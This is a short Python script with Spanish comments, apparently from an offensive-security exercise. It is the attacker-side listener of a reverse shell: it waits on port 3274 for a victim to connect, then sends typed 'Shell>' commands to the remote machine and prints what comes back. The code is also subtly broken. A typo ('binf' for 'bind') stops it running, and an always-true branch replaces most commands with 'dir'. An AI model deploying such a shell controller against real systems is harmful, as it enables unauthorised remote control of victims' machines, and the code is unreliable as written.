import socket 

def connect():
    s = socket.socket()
    s.binf(("", 3274)) #agregar la IP de la máquina Kali y el puerto a conectarse
    s.listen(1) #se crea elk listener
    conn , addr = s.accept()
    print ('[+] got connection from ', addr)
    
    while True:
        command = input("Shell> ") #user input
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        elif '' in command:
            conn.send('dir'.encode())
            print (conn.recv(1024).decode())
        else:
            conn.send(command.encode())
            print (conn.recv(1024).decode()) #print resultado de la ejecución
            
def main():
    connect()

main()